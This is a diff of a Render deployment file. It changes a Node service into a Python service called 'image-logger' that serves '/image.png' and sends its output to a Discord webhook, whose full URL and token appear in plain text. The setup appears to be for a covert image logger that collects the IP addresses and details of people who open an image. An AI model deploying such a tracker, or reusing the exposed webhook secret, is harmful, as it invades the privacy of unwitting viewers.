@@ -1,9 +1,13 @@
 services:
   - type: web
-    name: exiled
-    runtime: node
-    buildCommand: npm install
-    startCommand: npm start
+    name: image-logger
+    env: python
+    plan: free
+    buildCommand: ""
+    startCommand: python3 app.py
+    healthCheckPath: "/image.png"
     envVars:
-      - key: PORT
-        value: 3000
+      - key: DISCORD_WEBHOOK_URL
+        value: "https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz"
+      - key: PUBLIC_URL
+        value: "https://yourapp.onrender.com/image.png"
